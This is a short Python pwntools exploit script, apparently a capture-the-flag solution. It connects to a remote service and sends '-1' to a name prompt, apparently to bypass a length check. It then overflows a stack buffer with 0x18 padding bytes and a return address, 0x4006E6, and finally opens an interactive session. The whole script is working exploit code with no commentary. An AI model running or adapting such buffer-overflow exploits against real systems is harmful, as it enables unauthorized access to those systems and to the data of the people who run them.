from pwn import *
p=remote('1.14.71.254',28293)
back=0x4006E6
p.sendlineafter("ame:",'-1')
payload=b'a'*0x18+p64(back)
p.sendline(payload)
p.interactive()
